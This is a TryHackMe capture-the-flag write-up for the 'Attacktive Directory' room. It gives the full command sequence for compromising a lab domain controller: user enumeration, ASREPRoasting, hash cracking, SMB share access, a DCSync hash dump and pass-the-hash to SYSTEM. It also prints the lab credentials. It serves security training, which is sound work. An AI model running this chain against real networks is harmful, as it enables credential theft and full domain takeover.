# Attacktive Directory – TryHackMe Writeup

## Objective
Exploit a vulnerable Active Directory Domain Controller by performing user enumeration, ASREPRoasting, SMB abuse, and Domain Controller hash extraction to gain full administrative access.

---

# Initial Enumeration

## Check host
```bash
ping -c 5 <target-ip>
```

## Full scan
```bash
nmap -sC -sV -p- <target-ip>
```

Identified:
- SMB (445)
- LDAP (389)
- Kerberos (88)
- Domain Controller services

---

# SMB & Domain Enumeration

## Enum4linux
```bash
enum4linux -a <target-ip> | tee enum.txt
```

Discovered:
- NetBIOS Domain Name
- Domain: `spookysec.local`

---

## List SMB shares
```bash
smbclient -L \\\\<target-ip>\\
```

---

# Kerberos User Enumeration

## Confirm LDAP
```bash
nmap -p 389 -sV <target-ip>
```

## Enumerate valid users
```bash
kerbrute userenum -d spookysec.local --dc <target-ip> username-wordlist.txt
```

Found valid accounts:
- svc-admin
- backup

---

# ASREPRoasting Attack

Some accounts had:
```
"Do not require Kerberos preauthentication"
```

## Retrieve ASREP hash
```bash
python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip <target-ip>
```

Save hash → `hash.txt`

---

## Crack hash
```bash
john hash.txt --wordlist=passwordlist.txt
```

Credentials recovered:
```
svc-admin : management2005
```

---

# SMB Access with svc-admin

```bash
smbclient -L \\\\<target-ip>\\ -U svc-admin
```

Accessible share:
```
backup
```

## Access share
```bash
smbclient \\\\<target-ip>\\backup -U svc-admin
```

Downloaded:
```
backup_credentials.txt
```

---

## Decode credentials

File was Base64 encoded:

```bash
echo "encoded_string" | base64 -d
```

Recovered:
```
backup@spookysec.local : backup2517860
```

---

# Domain Privilege Escalation (DCSync)

## Dump NTDS hashes
```bash
secretsdump.py spookysec.local/backup:'backup2517860'@<target-ip> -just-dc
```

Successfully extracted Domain Administrator NTLM hash.

---

# Pass-the-Hash Attack

## Evil-WinRM
```bash
evil-winrm -i <target-ip> -u Administrator@spookysec.local -H <NTLM-hash>
```

OR using Impacket:
```bash
psexec.py Administrator@<target-ip> -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM-hash>
```

Obtained:
```
NT AUTHORITY\SYSTEM
```

---

# Flags

```
C:\Users\svc-admin\Desktop\user.txt.txt
C:\Users\backup\Desktop\PrivEsc.txt
C:\Users\Administrator\Desktop\root.txt
```

---

# Attack Flow Summary

1. Nmap enumeration  
2. SMB & domain discovery  
3. Kerberos user enumeration  
4. ASREPRoasting  
5. Hash cracking  
6. SMB share access  
7. Credential decoding  
8. DCSync attack  
9. Pass-the-Hash  
10. SYSTEM access  

---

# Techniques Practiced

- Active Directory enumeration  
- Kerberos user enumeration  
- ASREPRoasting  
- SMB share abuse  
- Base64 credential discovery  
- DCSync (NTDS dump)  
- Pass-the-Hash  
- Domain Administrator compromise  

---

# Tools Used

- Nmap  
- Enum4linux  
- Kerbrute  
- GetNPUsers.py  
- John the Ripper  
- SMBClient  
- Impacket (secretsdump, psexec)  
- Evil-WinRM  

---

✅ Room completed successfully
